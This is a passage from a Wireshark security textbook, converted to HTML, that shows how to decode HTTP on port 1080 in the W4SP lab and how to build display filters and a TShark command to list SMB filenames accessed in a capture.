style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >W4SP Lab: Managing Nonstandard HTTP Traffic</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >An example of HTTP traffic over a nonstandard port is provided for you in the Wireshark for Security Professionals (W4SP) Lab. In the virtual lab environment, the server FTP1 is serving web traffic over TCP port 1080. Capturing traffic in Wireshark will present that traffic incorrectly. You need to alter the way Wireshark interprets the traffic so that the protocol is correctly labeled in the Packet List pane.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >With this example, the packets will usually be shown as just type TCP because that was the highest level protocol that Wireshark can immediately identify. If you want to tell Wireshark it has to use the HTTP dissector on traffic, you will need to add a dissection rule.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:13.0500pt;" ><span style="position:absolute;z-index:-1;margin-left:342.5000px;margin-top:134.4167px;width:22.0000px;height:17.0000px;" ><img width="22"  height="17"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker227327.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Our example has captured some HTTP traffic that is going over port 1080. In this case, however, Wireshark confused the traffic as Socks, as the default port for Socks traffic is 1080. To solve this dilemma, a new dissection rule is applied. To add a dissection rule, select a packet and</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >choose</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Analyze</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Decode As, or right-click one of the packets</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.3000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >you want to change the decoding of and select Decode As.<a name="_bookmark340" ></a>&nbsp;</span><span><a href="#_bookmark341" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-27</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows this process with the Decode As</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.5000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >window.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section176" ><p class=MsoBodyText ><img width="780"  height="502"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker227823.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark341" ></a><span><a href="#_bookmark340" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-27:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Wireshark&#8217;s Decode As window</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:11.1500pt;" ><a name="_bookmark342" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To apply the HTTP dissector to the TCP stream, select HTTP from the available protocol choices to tell Wireshark to apply the dissector to TCP traffic that is using the port 1080. Click OK to save your settings. When you return to the Packet List pane, Wireshark is now able to identify the HTTP traffic correctly.<a name="_bookmark343" ></a>&nbsp;</span><span><a href="#_bookmark344" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-28</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows that we&#8217;ve told Wireshark to correctly decode the traffic over 1080/tcp as HTTP.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section177" ><p class=MsoBodyText ><img width="781"  height="446"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker228347.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark344" ></a><span><a href="#_bookmark343" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-28:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Wireshark&#8217;s Decode As window</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.2000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Filtering SMB Filenames</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:12.0500pt;" ><a name="_bookmark345" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Server Message Block (SMB) is a good protocol for a practical example. Every network with some Windows clients will have some SMB activity, especially when a domain is set up and the clients are connected to various network shares. This section illustrates the process in which a filter evolves. The process used within this section can be applied to any other type of scenario where you have a packet field you want focus on. Notice that you don&#8217;t necessarily need to read any RFCs or reverse engineer the protocol. The Wireshark dissector has done all the heavy lifting for you in this case, and all you need to do is figure out how to build the appropriate filter.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To start, packets are scrolling by too fast to read. Most of it is HTTP traffic with an occasional burst of SMB with a spattering of ARP and DHCP broadcasts. Suppose you have been tasked to figure out which files are being accessed over SMB. You are focusing on SMB traffic, so the logical first step is to filter for it by using </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >smb </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >as the filter. For new versions of Windows, such as in<a name="_bookmark346" ></a>&nbsp;</span><span><a href="#_bookmark347" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-29</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, you will use </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >smb2 </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >as the filter.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section178" ><p class=MsoBodyText ><img width="779"  height="719"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker229584.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark347" ></a><span><a href="#_bookmark346" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-29:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Packet list filtering for SMB</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:11.1500pt;" ><a name="_bookmark348" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Not all the SMB packets you see now are the result of the computer accessing files. In fact, probably only a fraction of the packets are even accessing a file. The rest are concerned with metadata, directory</span><span><a href="#_bookmark347" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;listings, and just general protocol overhead. The packet list in </span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >4-29</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >has what appears to be a path in the description and would</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;therefore serve as a good starting point for further investigation.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Because you are looking for filenames being accessed, you should find differentiating properties for this SMB packet so that you can filter for all the packets concerned with a filename or path. If you look at the Packet Bytes pane, the filename is obviously in there. There is a little</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section179" ><p class=MsoBodyText  style="margin-top:3.7000pt;margin-right:10.4500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >trick here: When you click on the filename in the Packet Bytes hexadecimal display, Wireshark will highlight the corresponding object in the Packet Details pane. If it highlights the entire Trans2 object, just expand it until you see the corresponding field. The corresponding filter field for this file attribute is </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >smb2.filename</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, so this is the filter you can apply next. This filter has narrowed the list of packets down to all the SMB requests that reference a file. Sounds pretty close, right? The Packet List pane should now look somewhat like<a name="_bookmark349" ></a>&nbsp;</span><span><a href="#_bookmark350" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-30</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="781"  height="719"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker230989.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.6500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark350" ></a><span><a href="#_bookmark349" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-30:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >SMB packets referencing a file</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section180" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:9.8000pt;" ><a name="_bookmark351" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To narrow it down further, you need to determine what sequence of packets forms the transaction of accessing a file with SMB. The quickest way to do this is to control the actions of the client by copying a file from a share and tracing this in Wireshark. The best way is to consult reference documentation for the protocols you are analyzing, but generally time is against you in the security field and you may encounter protocols that are not that well documented. To see the packets concerned with copying your file, use the filter </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >smb.file contains"partoffilename"</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Using this relatively limited set of packets, the types of packets in a transaction can be analyzed by manual inspection. Use the descriptions Wireshark gives you to try and analyze how the transaction starts and finishes.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.3000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A good packet to choose for the purpose of finding accessed filenames is the NT Create AndX Request. This SMB procedure call is usually preceded by Query Path Info calls that the client uses to do directory listings and check file parameters such as size. The NT Create packet creates an SMB pipe to the file after which it gets transferred using Read AndX calls. The transfer calls adjust the byte offset argument after each call to get a different chunk of the requested file in the server&#8217;s response. After the transfer is finished, the client usually closes the access pipe and requests Path Info again. Now you have almost all the information you need to build a filter showing just packets that are accessing a file and the filename shown in the description column for easy reference.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To show only the NT Create commands, you can use the </span><i><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-style:italic;font-size:12.0000pt;" >smb.cmd</span></i><i><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.6500pt;font-style:italic;font-size:12.0000pt;" >&nbsp;</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >filter. Find the correct value by inspecting the NT Create packet in your known filename trace. The filter should now be </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >smb.file and smb.cmd</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="line-height:17.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >== 0xa2</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The packet list should look somewhat like<a name="_bookmark352" ></a>&nbsp;</span><span><a href="#_bookmark353" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-31</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="784"  height="174"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker232951.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.3000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark353" ></a><span><a href="#_bookmark352" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-31:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Packet list filtered for NT Create calls</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section181" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:10.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You can make one last optimization in the filter. The packet list now shows one line with a filename and the other without a filename in the Info column. This is because the Wireshark SMB dissector doesn&#8217;t show the filename parameter for a server response. You can inspect the packets again to determine whether the protocol stores this information in a packet. The answer can be found in the </span><i><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-style:italic;font-size:12.0000pt;" >flags </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >object, which stores a </span><i><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-style:italic;font-size:12.0000pt;" >response </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >variable that you can match against in an expression. You can use the following filter to show only requests going to the server:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.7000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >smb.file and smb.cmd == 0xa2 and smb.flags.response == 0</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="280"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker233658.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:9.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:5.8000pt;margin-right:9.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >While the list of files is now human readable, it is neither exportable nor suitable for reporting purposes. TShark is the best tool to get there, combined with some Unix command line magic for the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >finishing touch. To get a list of all the files accessed, you can run TShark while only showing the SMB filename. This, combined with the filter, results in a list of accessed files, although there will be some duplicates because of the way SMB clients work. To get rid of the duplicates, you can use </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >uniq</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >sort</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, both standard Unix tools.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The Unix </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >uniq </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >command will display any unique line but remove subsequent repeated lines. So, if you have &#8220;AAA&#8221; repeated four times, followed by &#8220;BBB&#8221; 10 times, then &#8220;CCC&#8221; another 10 times, then the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >uniq</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.5000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >command will present only &#8220;AAA,&#8221; &#8220;BBB,&#8221; and &#8220;CCC&#8221; once each.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  align=justify  style="margin-top:7.0000pt;margin-right:17.4000pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The Unix </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >sort</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.5500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >command displays items in a sorted manner, generally alphabetically. For example, let&#8217;s say you have a list of names, such</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >as &#8220;Charlie,&#8221; &#8220;Alice,&#8221; &#8220;Dave,&#8221; and &#8220;Bob.&#8221; Using the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >sort</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.9000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >command, the</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section182" ><p class=MsoBodyText  style="margin-top:3.5000pt;margin-right:17.2500pt;line-height:146%;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >output would be the list in the order: Alice, Bob, Charlie, and Dave. Try the following command yourself:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:4.1500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >tshark -2 -R "smb.file and smb.cmd == 0xa2 and smb.flags.response</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >== 0"</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-T fields -e smb.file -r smb_test.dump \</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  